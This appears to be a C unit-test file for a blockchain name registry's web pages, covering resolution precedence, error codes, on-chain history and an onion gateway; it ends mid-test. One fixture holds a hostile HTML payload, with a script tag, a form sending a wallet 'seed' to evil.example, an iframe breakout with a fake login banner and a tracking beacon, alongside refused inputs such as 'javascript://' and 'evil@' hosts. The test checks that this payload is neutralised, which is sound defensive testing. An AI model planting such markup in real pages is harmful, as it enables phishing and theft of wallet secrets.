/* Copyright 2026 Rhett Creighton - Apache License 2.0
 *
 * Tests for the ZCL Names HTML site slice
 * (app/controllers/src/name_site_controller.c + app/views/src/name_view.c):
 *   - name→site resolution precedence (onion > url > profile fallback)
 *   - browse index / profile show render
 *   - register POST refusals (missing CSRF, missing PoW)
 *   - the name-bound proof-of-work gate (verify + single-use replay refusal)
 *   - the name_records relationship RPC
 *   - the resolution ERROR TAXONOMY: absent vs malformed vs
 *     registered-but-no-such-target must never collapse into one answer
 *     (docs/spec/power-node-contract.md), at the resolver AND on HTTP
 *   - the on-chain history presentation (registered/changed heights + txids)
 *   - the onion GATEWAY: off by default, hostile-hostname refusal, the
 *     hard size cap, and that relayed bytes are rendered inert
 *
 * Model validation, projection fold (register→update→transfer→renew→expire),
 * and rebuild-from-scratch idempotence are covered by test_znam.c /
 * test_znam_projection.c; this file exercises the request-path surface built
 * on top of them. */

#include "test/test_core.h"
#include "controllers/name_site_controller.h"
#include "controllers/name_controller.h"
#include "controllers/name_resolver.h"
#include "controllers/name_gateway_controller.h"
#include "views/name_gateway_view.h"
#include "models/znam.h"
#include "models/database.h"
#include "rpc/server.h"
#include "json/json.h"
#include "crypto/sha3.h"
#include "net/fast_sync.h"

#include <inttypes.h>
#include <stdio.h>
#include <string.h>

#define TS_CHECK(label, cond)                                             \
    do {                                                                  \
        if (!(cond)) { printf("  FAIL: %s\n", (label)); failures++; }     \
    } while (0)

static bool open_site_db(sqlite3 **db_out, struct node_db *ndb_out)
{
    sqlite3 *db = NULL;
    if (sqlite3_open(":memory:", &db) != SQLITE_OK) return false;
    sqlite3_exec(db,
        "CREATE TABLE znam_names("
        "name TEXT PRIMARY KEY, owner_address TEXT,"
        "target_type INTEGER, target_value TEXT,"
        "reg_txid BLOB, reg_height INTEGER,"
        "last_update_txid BLOB,"
        "expiry_height INTEGER NOT NULL DEFAULT 0)", NULL, NULL, NULL);
    sqlite3_exec(db,
        "CREATE TABLE znam_text_records("
        "name TEXT, key TEXT, value TEXT,"
        "PRIMARY KEY(name,key))", NULL, NULL, NULL);
    sqlite3_exec(db,
        "CREATE TABLE znam_addr_records("
        "name TEXT, coin_type INTEGER, address TEXT,"
        "PRIMARY KEY(name,coin_type))", NULL, NULL, NULL);
    *db_out = db;
    memset(ndb_out, 0, sizeof(*ndb_out));
    ndb_out->db = db;
    ndb_out->open = true;
    return true;
}

static bool seed_name(struct node_db *ndb, const char *name,
                      uint8_t type, const char *value)
{
    struct znam_entry e;
    memset(&e, 0, sizeof(e));
    snprintf(e.name, sizeof(e.name), "%s", name);
    snprintf(e.owner_address, sizeof(e.owner_address), "t1Owner%s", name);
    e.target_type = type;
    snprintf(e.target_value, sizeof(e.target_value), "%s", value);
    memset(e.reg_txid, 0xAB, 32);          /* non-zero — validator requires it */
    memset(e.last_update_txid, 0xAB, 32);
    e.reg_height = 100;
    e.expiry_height = 210340;
    return db_znam_save(ndb, &e);
}

/* Solve the name-bound register puzzle and format ts/nonce as decimal
 * strings, exactly as the browser/curl client would submit them. */
static void solve_name_pow(const char *name, char ts_out[32], char nonce_out[32])
{
    char ctx[128];
    uint8_t peer[32];
    int n = snprintf(ctx, sizeof(ctx), "znam:register:pow:%s", name);
    sha3_256((const unsigned char *)ctx, (size_t)n, peer);
    struct fast_sync_pow pow;
    memset(&pow, 0, sizeof(pow));
    fast_sync_solve_pow(peer, &pow);
    snprintf(ts_out, 32, "%lld", (long long)pow.timestamp);
    snprintf(nonce_out, 32, "%llu", (unsigned long long)pow.nonce);
}

static int t_resolution_precedence(void)
{
    int failures = 0;
    sqlite3 *db = NULL;
    struct node_db ndb;
    if (!open_site_db(&db, &ndb)) return 1;
    rpc_name_set_state(&ndb);

    /* onion via primary target, plus a competing url text record → onion wins */
    TS_CHECK("seed onionpri", seed_name(&ndb, "onionpri", ZNAM_TYPE_ONION,
                                        "aaaa.onion"));
    db_znam_text_save(&ndb, "onionpri", "url", "http://example.com");

    /* onion via explicit text record (primary is a t-addr) → onion still wins */
    TS_CHECK("seed oniontxt", seed_name(&ndb, "oniontxt", ZNAM_TYPE_TADDR,
                                        "t1Addr"));
    db_znam_text_save(&ndb, "oniontxt", "onion", "bbbb.onion");
    db_znam_text_save(&ndb, "oniontxt", "url", "http://nope.com");

    /* url only → redirect to url */
    TS_CHECK("seed urlsite", seed_name(&ndb, "urlsite", ZNAM_TYPE_TADDR,
                                       "t1Addr"));
    db_znam_text_save(&ndb, "urlsite", "url", "https://site.example");

    /* nothing routable → profile page fallback */
    TS_CHECK("seed profonly", seed_name(&ndb, "profonly", ZNAM_TYPE_TADDR,
                                        "t1AddrProfile"));

    uint8_t resp[65536];
    size_t nb;

    nb = name_site_handle_request("GET", "/n/onionpri", NULL, 0, resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("onion primary -> 302", strstr((char *)resp, "302 Found") != NULL);
    TS_CHECK("onion primary Location",
             strstr((char *)resp, "Location: http://aaaa.onion/") != NULL);

    nb = name_site_handle_request("GET", "/n/oniontxt", NULL, 0, resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("onion text beats url",
             strstr((char *)resp, "Location: http://bbbb.onion/") != NULL);

    nb = name_site_handle_request("GET", "/n/urlsite", NULL, 0, resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("url -> 302", strstr((char *)resp, "302 Found") != NULL);
    TS_CHECK("url Location",
             strstr((char *)resp, "Location: https://site.example") != NULL);

    nb = name_site_handle_request("GET", "/n/profonly", NULL, 0, resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("profile fallback 200", strstr((char *)resp, "200 OK") != NULL);
    TS_CHECK("profile shows name", strstr((char *)resp, "profonly") != NULL);
    TS_CHECK("profile shows owner",
             strstr((char *)resp, "t1Ownerprofonly") != NULL);

    /* unknown name → 404 ABSENT */
    nb = name_site_handle_request("GET", "/n/ghost", NULL, 0, resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("unknown -> 404", strstr((char *)resp, "404 Not Found") != NULL);

    /* invalid name (uppercase) → 400 MALFORMED, never a resolution and
     * never the same answer as "absent". */
    nb = name_site_handle_request("GET", "/n/BadName", NULL, 0, resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("invalid name -> 400", strstr((char *)resp, "400 Bad Request") != NULL);

    rpc_name_set_state(NULL);
    sqlite3_close(db);
    return failures;
}

/* ── Error taxonomy ─────────────────────────────────────────────────
 *
 * docs/spec/power-node-contract.md: "Resolution APIs must distinguish
 * absent names, malformed names, and records that exist but lack the
 * requested target type." Three inputs, three verdicts, three HTTP
 * statuses, three machine codes — and none of them equal to another. */
static int t_error_taxonomy(void)
{
    int failures = 0;
    sqlite3 *db = NULL;
    struct node_db ndb;
    struct name_resolution res;
    if (!open_site_db(&db, &ndb)) return 1;
    rpc_name_set_state(&ndb);

    seed_name(&ndb, "payonly", ZNAM_TYPE_TADDR, "t1PayOnly");
    db_znam_addr_save(&ndb, "payonly", ZNAM_TYPE_BTC, "bc1qpay");

    /* ── resolver level ── */
    TS_CHECK("malformed (uppercase)",
             name_resolve(&ndb, "BadName", 0, &res) == NAME_RESOLVE_MALFORMED);
    TS_CHECK("malformed (empty)",
             name_resolve(&ndb, "", 0, &res) == NAME_RESOLVE_MALFORMED);
    TS_CHECK("malformed (NULL)",
             name_resolve(&ndb, NULL, 0, &res) == NAME_RESOLVE_MALFORMED);
    TS_CHECK("malformed does not look anything up", !res.have_entry);

    TS_CHECK("absent",
             name_resolve(&ndb, "nosuchname", 0, &res) == NAME_RESOLVE_ABSENT);
    TS_CHECK("absent has no entry", !res.have_entry);

    TS_CHECK("wrong target type",
             name_resolve(&ndb, "payonly", ZNAM_TYPE_ONION, &res)
                 == NAME_RESOLVE_NO_SUCH_TARGET);
    /* The distinguishing fact: unlike ABSENT, this name HAS an owner, so
     * the caller is told who to ask. */
    TS_CHECK("wrong-target keeps the entry", res.have_entry);
    TS_CHECK("wrong-target names the owner",
             strcmp(res.entry.owner_address, "t1Ownerpayonly") == 0);

    TS_CHECK("right target type resolves",
             name_resolve(&ndb, "payonly", ZNAM_TYPE_TADDR, &res)
                 == NAME_RESOLVE_OK);
    TS_CHECK("secondary address record resolves",
             name_resolve(&ndb, "payonly", ZNAM_TYPE_BTC, &res)
                 == NAME_RESOLVE_OK);
    TS_CHECK("secondary record value", strcmp(res.value, "bc1qpay") == 0);

    TS_CHECK("registry unavailable is not 'absent'",
             name_resolve(NULL, "payonly", 0, &res)
                 == NAME_RESOLVE_REGISTRY_UNAVAILABLE);

    /* The three codes are distinct strings, not three spellings of one. */
    TS_CHECK("codes distinct: malformed vs absent",
             strcmp(name_resolve_status_code(NAME_RESOLVE_MALFORMED),
                    name_resolve_status_code(NAME_RESOLVE_ABSENT)) != 0);
    TS_CHECK("codes distinct: absent vs no-such-target",
             strcmp(name_resolve_status_code(NAME_RESOLVE_ABSENT),
                    name_resolve_status_code(NAME_RESOLVE_NO_SUCH_TARGET)) != 0);
    TS_CHECK("messages distinct: absent vs no-such-target",
             strcmp(name_resolve_status_message(NAME_RESOLVE_ABSENT),
                    name_resolve_status_message(NAME_RESOLVE_NO_SUCH_TARGET)) != 0);
    TS_CHECK("malformed is a 400",
             strcmp(name_resolve_status_http(NAME_RESOLVE_MALFORMED),
                    "400 Bad Request") == 0);
    TS_CHECK("registry-unavailable is a 503",
             strcmp(name_resolve_status_http(NAME_RESOLVE_REGISTRY_UNAVAILABLE),
                    "503 Service Unavailable") == 0);

    /* ── HTTP surface ── */
    uint8_t resp[65536];
    size_t nb;

    nb = name_site_handle_request("GET", "/n/BadName", NULL, 0, resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("http malformed status",
             strstr((char *)resp, "400 Bad Request") != NULL);
    TS_CHECK("http malformed code header",
             strstr((char *)resp, "X-ZCL-Name-Error: NAME_MALFORMED") != NULL);

    nb = name_site_handle_request("GET", "/n/nosuchname", NULL, 0, resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("http absent status", strstr((char *)resp, "404 Not Found") != NULL);
    TS_CHECK("http absent code header",
             strstr((char *)resp, "X-ZCL-Name-Error: NAME_ABSENT") != NULL);

    nb = name_site_handle_request("GET", "/n/payonly?type=onion", NULL, 0,
                                  resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("http wrong-target code header",
             strstr((char *)resp, "X-ZCL-Name-Error: NAME_NO_SUCH_TARGET")
                 != NULL);
    TS_CHECK("http wrong-target names the owner",
             strstr((char *)resp, "t1Ownerpayonly") != NULL);
    TS_CHECK("http wrong-target is not the absent page",
             strstr((char *)resp, "NAME_ABSENT") == NULL);

    nb = name_site_handle_request("GET", "/n/payonly?type=wombat", NULL, 0,
                                  resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("http unknown type code header",
             strstr((char *)resp, "X-ZCL-Name-Error: NAME_TYPE_UNKNOWN")
                 != NULL);

    /* A constrained lookup that DOES resolve is a normal page. */
    nb = name_site_handle_request("GET", "/n/payonly?type=btc", NULL, 0,
                                  resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("http right-type resolves 200",
             strstr((char *)resp, "200 OK") != NULL);

    /* /names/<name> carries the same taxonomy, not a second dialect. */
    nb = name_site_handle_request("GET", "/names/BadName", NULL, 0,
                                  resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("/names malformed code header",
             strstr((char *)resp, "X-ZCL-Name-Error: NAME_MALFORMED") != NULL);

    /* No registry wired at all is a 503, never a 404 — "we cannot look"
     * is not "it is not there". */
    rpc_name_set_state(NULL);
    nb = name_site_handle_request("GET", "/n/payonly", NULL, 0,
                                  resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("http registry-unavailable is 503",
             strstr((char *)resp, "503 Service Unavailable") != NULL);
    TS_CHECK("http registry-unavailable code header",
             strstr((char *)resp, "X-ZCL-Name-Error: NAME_REGISTRY_UNAVAILABLE")
                 != NULL);

    sqlite3_close(db);
    return failures;
}

/* ── name_resolve RPC taxonomy ──────────────────────────────────── */
static int t_resolve_rpc_taxonomy(void)
{
    int failures = 0;
    sqlite3 *db = NULL;
    struct node_db ndb;
    struct rpc_table t;
    if (!open_site_db(&db, &ndb)) return 1;
    rpc_name_set_state(&ndb);
    rpc_table_init(&t);
    register_name_rpc_commands(&t);

    seed_name(&ndb, "rpconly", ZNAM_TYPE_TADDR, "t1Rpc");

    const struct rpc_command *cmd = rpc_table_find(&t, "name_resolve");
    TS_CHECK("name_resolve registered", cmd != NULL);

    static const struct { const char *name; const char *type; const char *code; }
        cases[] = {
        { "BadName",  NULL,      "NAME_MALFORMED" },
        { "ghostname", NULL,     "NAME_ABSENT" },
        { "rpconly",  "onion",   "NAME_NO_SUCH_TARGET" },
        { "rpconly",  "wombat",  "NAME_TYPE_UNKNOWN" },
    };

    for (size_t i = 0; cmd && i < sizeof(cases) / sizeof(cases[0]); i++) {
        struct json_value params = {0}, arg = {0}, targ = {0}, result = {0};
        json_set_array(&params);
        json_set_str(&arg, cases[i].name);
        json_push_back(&params, &arg);
        json_free(&arg);
        if (cases[i].type) {
            json_set_str(&targ, cases[i].type);
            json_push_back(&params, &targ);
            json_free(&targ);
        }
        bool ok = cmd->actor(&params, false, &result);
        const char *code = json_get_str(json_get(&result, "error_code"));
        TS_CHECK("resolve rpc answered", ok);
        TS_CHECK("resolve rpc taxonomy code",
                 code && strcmp(code, cases[i].code) == 0);
        TS_CHECK("resolve rpc says not resolved",
                 json_get(&result, "resolved") &&
                 !json_get_bool(json_get(&result, "resolved")));
        json_free(&params);
        json_free(&result);
    }

    /* Success still carries the record AND names what it resolved to. */
    if (cmd) {
        struct json_value params = {0}, arg = {0}, result = {0};
        json_set_array(&params);
        json_set_str(&arg, "rpconly");
        json_push_back(&params, &arg);
        json_free(&arg);
        bool ok = cmd->actor(&params, false, &result);
        const char *val = json_get_str(json_get(&result, "resolved_value"));
        TS_CHECK("resolve rpc ok", ok);
        TS_CHECK("resolve rpc resolved flag",
                 json_get_bool(json_get(&result, "resolved")));
        TS_CHECK("resolve rpc value", val && strcmp(val, "t1Rpc") == 0);
        TS_CHECK("resolve rpc carries history",
                 json_get(&result, "history") != NULL);
        json_free(&params);
        json_free(&result);
    }

    rpc_name_set_state(NULL);
    sqlite3_close(db);
    return failures;
}

/* ── On-chain history presentation ──────────────────────────────── */
static int t_history_presentation(void)
{
    int failures = 0;
    sqlite3 *db = NULL;
    struct node_db ndb;
    struct name_history h;
    if (!open_site_db(&db, &ndb)) return 1;
    rpc_name_set_state(&ndb);

    /* Never changed: reg_txid == last_update_txid (what seed_name writes). */
    seed_name(&ndb, "steady", ZNAM_TYPE_TADDR, "t1Steady");
    struct znam_entry e;
    TS_CHECK("load steady", db_znam_find(&ndb, "steady", &e));
    name_history_load(&ndb, &e, &h);
    TS_CHECK("steady not changed", !h.changed);
    TS_CHECK("steady change height == reg height",
             h.last_change_height == e.reg_height);
    TS_CHECK("steady reg height", h.reg_height == 100);
    TS_CHECK("steady expiry carried", h.expiry_height == 210340);

    /* Changed: a different last_update_txid, and no tx index in this
     * fixture — the height must come back UNKNOWN (-1), never guessed. */
    struct znam_entry c;
    memset(&c, 0, sizeof(c));
    snprintf(c.name, sizeof(c.name), "%s", "moved");
    snprintf(c.owner_address, sizeof(c.owner_address), "%s", "t1OwnerMoved");
    c.target_type = ZNAM_TYPE_ONION;
    snprintf(c.target_value, sizeof(c.target_value), "%s", "moved.onion");
    memset(c.reg_txid, 0x11, 32);
    memset(c.last_update_txid, 0x22, 32);
    c.reg_height = 500;
    c.expiry_height = 610340;
    TS_CHECK("save moved", db_znam_save(&ndb, &c));
    name_history_load(&ndb, &c, &h);
    TS_CHECK("moved is changed", h.changed);
    TS_CHECK("moved height unknown, not guessed", h.last_change_height == -1);
    TS_CHECK("moved reg txid rendered",
             strncmp(h.reg_txid_hex, "1111", 4) == 0);
    TS_CHECK("moved change txid rendered",
             strncmp(h.last_change_txid_hex, "2222", 4) == 0);

    /* The profile page shows it — this is the whole point of the item:
     * the data existed, the presentation did not. */
    uint8_t resp[65536];
    size_t nb = name_site_handle_request("GET", "/names/moved", NULL, 0,
                                         resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("profile has history card",
             strstr((char *)resp, "On-chain history") != NULL);
    TS_CHECK("profile shows registration height",
             strstr((char *)resp, "block 500") != NULL);
    TS_CHECK("profile links the registration tx",
             strstr((char *)resp, "/explorer/tx/1111") != NULL);
    TS_CHECK("profile links the change tx",
             strstr((char *)resp, "/explorer/tx/2222") != NULL);
    TS_CHECK("profile does not invent a change height",
             strstr((char *)resp, "height not known to this node") != NULL);
    TS_CHECK("profile makes the CA argument",
             strstr((char *)resp, "certificate authority") != NULL);

    nb = name_site_handle_request("GET", "/names/steady", NULL, 0,
                                  resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("unchanged name says so",
             strstr((char *)resp, "none &mdash; the registration") != NULL ||
             strstr((char *)resp, "none — the registration") != NULL);

    rpc_name_set_state(NULL);
    sqlite3_close(db);
    return failures;
}

/* ── Onion gateway ──────────────────────────────────────────────── */

/* A syntactically exact Tor v3 hostname: 56 chars of [a-z2-7] + ".onion". */
#define GW_GOOD_HOST \
    "abcdefghijklmnopqrstuvwxyz234567abcdefghijklmnopqrstuvwx.onion"

static int t_gateway_off_by_default(void)
{
    int failures = 0;
    sqlite3 *db = NULL;
    struct node_db ndb;
    if (!open_site_db(&db, &ndb)) return 1;
    rpc_name_set_state(&ndb);

    unsetenv("ZCL_NAMES_ONION_GATEWAY");
    TS_CHECK("gateway off by default", !name_gateway_enabled());

    /* Off means nothing is dialled, whatever the target looks like. */
    struct name_gateway_result *g = malloc(sizeof(*g));
    TS_CHECK("alloc gateway result", g != NULL);
    if (g) {
        TS_CHECK("fetch refuses while disabled",
                 name_gateway_fetch(GW_GOOD_HOST, g) == NAME_GATEWAY_DISABLED);
        TS_CHECK("disabled fetch dialled nothing", g->body_len == 0);
        free(g);
    }

    /* And /n/<name> keeps the pre-existing 302 exactly. */
    seed_name(&ndb, "gwname", ZNAM_TYPE_ONION, GW_GOOD_HOST);
    uint8_t resp[65536];
    size_t nb = name_site_handle_request("GET", "/n/gwname", NULL, 0,
                                         resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("gateway off -> still a 302",
             strstr((char *)resp, "302 Found") != NULL);
    TS_CHECK("gateway off -> Location is the onion",
             strstr((char *)resp, "Location: http://" GW_GOOD_HOST "/") != NULL);

    rpc_name_set_state(NULL);
    sqlite3_close(db);
    return failures;
}

static int t_gateway_hostname_gate(void)
{
    int failures = 0;
    char host[NAME_GATEWAY_HOST_MAX];

    TS_CHECK("valid v3 host accepted", name_gateway_host_valid(GW_GOOD_HOST));
    TS_CHECK("NULL host refused", !name_gateway_host_valid(NULL));
    TS_CHECK("short host refused", !name_gateway_host_valid("abc.onion"));
    TS_CHECK("v2 host refused",
             !name_gateway_host_valid("abcdefghijklmnop.onion"));
    TS_CHECK("non-onion tld refused",
             !name_gateway_host_valid(
                 "abcdefghijklmnopqrstuvwxyz234567abcdefghijklmnopqrstuvwx.com"));
    /* '1', '8', '9', '0' are not in Tor's base32 alphabet. */
    TS_CHECK("non-base32 char refused",
             !name_gateway_host_valid(
                 "1bcdefghijklmnopqrstuvwxyz234567abcdefghijklmnopqrstuvwx.onion"));
    TS_CHECK("localhost refused", !name_gateway_host_valid("localhost"));

    /* Target → host extraction, the actual hostile-input surface: the
     * target text is on-chain and attacker-chosen. */
    TS_CHECK("bare host extracted",
             name_gateway_host_from_target(GW_GOOD_HOST, host, sizeof(host)) &&
             strcmp(host, GW_GOOD_HOST) == 0);
    TS_CHECK("http scheme stripped",
             name_gateway_host_from_target("http://" GW_GOOD_HOST "/",
                                           host, sizeof(host)) &&
             strcmp(host, GW_GOOD_HOST) == 0);
    TS_CHECK("path and query stripped",
             name_gateway_host_from_target("https://" GW_GOOD_HOST "/a/b?c=d#e",
                                           host, sizeof(host)) &&
             strcmp(host, GW_GOOD_HOST) == 0);
    TS_CHECK("port 80 tolerated",
             name_gateway_host_from_target(GW_GOOD_HOST ":80",
                                           host, sizeof(host)));
    TS_CHECK("other port refused",
             !name_gateway_host_from_target(GW_GOOD_HOST ":8080",
                                            host, sizeof(host)));
    TS_CHECK("javascript scheme refused",
             !name_gateway_host_from_target("javascript://" GW_GOOD_HOST,
                                            host, sizeof(host)));
    TS_CHECK("userinfo refused",
             !name_gateway_host_from_target("http://evil@" GW_GOOD_HOST "/",
                                            host, sizeof(host)));
    TS_CHECK("clearnet host refused",
             !name_gateway_host_from_target("http://example.com/",
                                            host, sizeof(host)));
    TS_CHECK("loopback refused",
             !name_gateway_host_from_target("http://127.0.0.1:80/",
                                            host, sizeof(host)));
    TS_CHECK("empty target refused",
             !name_gateway_host_from_target("", host, sizeof(host)));
    TS_CHECK("refusal clears the output", host[0] == '\0');

    /* Case folding: hostnames are case-insensitive, onion base32 is not
     * uppercase — fold, then validate; never dial an unvalidated string. */
    TS_CHECK("uppercase host folded",
             name_gateway_host_from_target("HTTP://ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                                           "234567ABCDEFGHIJKLMNOPQRSTUVWX"
                                           ".ONION/", host, sizeof(host)) &&
             strcmp(host, GW_GOOD_HOST) == 0);
    return failures;
}

static int t_gateway_enabled_paths(void)
{
    int failures = 0;
    sqlite3 *db = NULL;
    struct node_db ndb;
    if (!open_site_db(&db, &ndb)) return 1;
    rpc_name_set_state(&ndb);

    setenv("ZCL_NAMES_ONION_GATEWAY", "1", 1);
    TS_CHECK("gateway opt-in read", name_gateway_enabled());

    uint8_t resp[65536];
    size_t nb;

    /* A registered target that is NOT an exact v3 onion is refused before
     * anything is dialled — and the visitor is told which rule refused it. */
    seed_name(&ndb, "badtarget", ZNAM_TYPE_ONION, "aaaa.onion");
    nb = name_site_handle_request("GET", "/n/badtarget", NULL, 0,
                                  resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("bad target -> 400", strstr((char *)resp, "400 Bad Request") != NULL);
    TS_CHECK("bad target names the rule",
             strstr((char *)resp, "GATEWAY_BAD_HOST") != NULL);
    TS_CHECK("bad target is not a redirect",
             strstr((char *)resp, "302 Found") == NULL);

    /* A well-formed target with Tor not running: the name still resolved,
     * so the page must say so and hand over the direct link rather than
     * pretending the name is broken. */
    seed_name(&ndb, "goodtarget", ZNAM_TYPE_ONION, GW_GOOD_HOST);
    nb = name_site_handle_request("GET", "/n/goodtarget", NULL, 0,
                                  resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("tor down -> 502", strstr((char *)resp, "502 Bad Gateway") != NULL);
    TS_CHECK("tor down names the reason",
             strstr((char *)resp, "GATEWAY_TOR_UNAVAILABLE") != NULL);
    TS_CHECK("tor down still offers the direct link",
             strstr((char *)resp, "http://" GW_GOOD_HOST "/") != NULL);

    /* No credential-bearing header is ever emitted by this surface. */
    TS_CHECK("no cookie header on the gateway response",
             strstr((char *)resp, "Set-Cookie") == NULL);
    TS_CHECK("relay response is uncached",
             strstr((char *)resp, "Cache-Control: no-store") != NULL);

    unsetenv("ZCL_NAMES_ONION_GATEWAY");
    rpc_name_set_state(NULL);
    sqlite3_close(db);
    return failures;
}

/* Everything the far side sends is hostile. Prove it is rendered inert and
 * cannot reach this node's own page context. */
static int t_gateway_relay_is_inert(void)
{
    int failures = 0;
    static uint8_t resp[262144];
    const char *hostile =
        "<script>alert('pwn')</script>"
        "<form action='http://evil.example/steal'>"
        "<input name='seed'></form>"
        "\"></iframe><h1>ZClassic23 wallet login</h1><iframe srcdoc=\""
        "<img src='http://evil.example/beacon.png'>";
    size_t nb = name_gateway_view_page("relayed", GW_GOOD_HOST,
                                       (const uint8_t *)hostile,
                                       strlen(hostile), 200, false,
                                       strlen(hostile), resp, sizeof(resp));
    TS_CHECK("relay page rendered", nb > 0 && nb < sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';

    /* The frame is sandboxed with NO allow-* token: opaque origin, no
     * scripts, no forms, no top-level navigation. */
    TS_CHECK("frame is sandboxed", strstr((char *)resp, "sandbox=''") != NULL);
    TS_CHECK("no sandbox escape hatch",
             strstr((char *)resp, "allow-scripts") == NULL &&
             strstr((char *)resp, "allow-same-origin") == NULL &&
             strstr((char *)resp, "allow-forms") == NULL);
    TS_CHECK("CSP present",
             strstr((char *)resp, "Content-Security-Policy: default-src 'none'")
                 != NULL);
    TS_CHECK("nosniff present",
             strstr((char *)resp, "X-Content-Type-Options: nosniff") != NULL);
    TS_CHECK("no referrer leaked upstream",
             strstr((char *)resp, "Referrer-Policy: no-referrer") != NULL);

    /* Not one hostile construct survives as live markup. */
    TS_CHECK("script tag escaped",
             strstr((char *)resp, "<script>alert") == NULL &&
             strstr((char *)resp, "&lt;script&gt;alert") != NULL);
    TS_CHECK("form tag escaped",
             strstr((char *)resp, "<form action=") == NULL);
    TS_CHECK("img tag escaped", strstr((char *)resp, "<img src=") == NULL);
    /* The srcdoc-breakout attempt: the quote must be an entity, so the
     * parent parser never leaves the attribute and the fake login header
     * cannot become this node's own chrome. */
    TS_CHECK("srcdoc breakout escaped",
             strstr((char *)resp, "\"></iframe><h1>") == NULL &&
             strstr((char *)resp, "&quot;&gt;&lt;/iframe&gt;") != NULL);
    /* The banner is outside the frame and states the relationship. */
    TS_CHECK("relay banner present",
             strstr((char *)resp, "does not vouch for it") != NULL);
    TS_CHECK("relay marked in the headers",
             strstr((char *)resp, "X-ZCL-Relay:") != NULL);
    return failures;
}

/* The caps are hard, and they are reported rather than hidden. */
static int t_gateway_caps(void)
{
    int failures = 0;
    static uint8_t resp[262144];
    static uint8_t big[NAME_GATEWAY_MAX_BODY_BYTES];

    TS_CHECK("body cap is bounded",
             NAME_GATEWAY_MAX_BODY_BYTES > 0 &&
             NAME_GATEWAY_MAX_BODY_BYTES <= 64u * 1024u);
    TS_CHECK("timeout cap is bounded",
             NAME_GATEWAY_TIMEOUT_SECS > 0 && NAME_GATEWAY_TIMEOUT_SECS <= 30);

    memset(big, 'A', sizeof(big));

    /* Truncation by the fetch cap is stated on the page, not swallowed. */
    size_t nb = name_gateway_view_page("relayed", GW_GOOD_HOST, big,
                                       sizeof(big), 200, true,
                                       sizeof(big) * 4, resp, sizeof(resp));
    TS_CHECK("capped page rendered", nb > 0 && nb <= sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("truncation is disclosed",
             strstr((char *)resp, "cut short") != NULL);

    /* A response buffer smaller than the body must still produce a
     * self-consistent response — never a Content-Length that lies. */
    static uint8_t small[8192];
    nb = name_gateway_view_page("relayed", GW_GOOD_HOST, big, sizeof(big),
                                200, false, sizeof(big), small, sizeof(small));
    TS_CHECK("small buffer respected", nb <= sizeof(small));
    if (nb > 0) {
        small[sizeof(small) - 1] = '\0';
        const char *cl = strstr((char *)small, "Content-Length: ");
        const char *hdr_end = strstr((char *)small, "\r\n\r\n");
        TS_CHECK("small response has a length", cl != NULL && hdr_end != NULL);
        if (cl && hdr_end) {
            size_t declared = (size_t)strtoul(cl + 16, NULL, 10);
            size_t actual = nb - (size_t)((hdr_end + 4) - (const char *)small);
            TS_CHECK("Content-Length matches the body", declared == actual);
        }
    }
    return failures;
}

static int t_index_and_show(void)
{
    int failures = 0;
    sqlite3 *db = NULL;
    struct node_db ndb;
    if (!open_site_db(&db, &ndb)) return 1;
    rpc_name_set_state(&ndb);

    seed_name(&ndb, "alpha", ZNAM_TYPE_ONION, "alpha.onion");
    seed_name(&ndb, "beta", ZNAM_TYPE_TADDR, "t1Beta");
    db_znam_text_save(&ndb, "beta", "email", "beta@example.com");

    uint8_t resp[65536];
    size_t nb;

    nb = name_site_handle_request("GET", "/names", NULL, 0, resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("index 200", strstr((char *)resp, "200 OK") != NULL);
    TS_CHECK("index lists alpha", strstr((char *)resp, "alpha") != NULL);
    TS_CHECK("index lists beta", strstr((char *)resp, "beta") != NULL);

    nb = name_site_handle_request("GET", "/names/beta", NULL, 0, resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("show beta 200", strstr((char *)resp, "200 OK") != NULL);
    TS_CHECK("show beta record",
             strstr((char *)resp, "beta@example.com") != NULL);

    /* register form renders with the CSRF token + embeds the PoW solver */
    nb = name_site_handle_request("GET", "/names/register", NULL, 0,
                                  resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("register form 200", strstr((char *)resp, "200 OK") != NULL);
    TS_CHECK("register form has csrf",
             strstr((char *)resp, "csrf_token") != NULL);
    TS_CHECK("register form has pow solver",
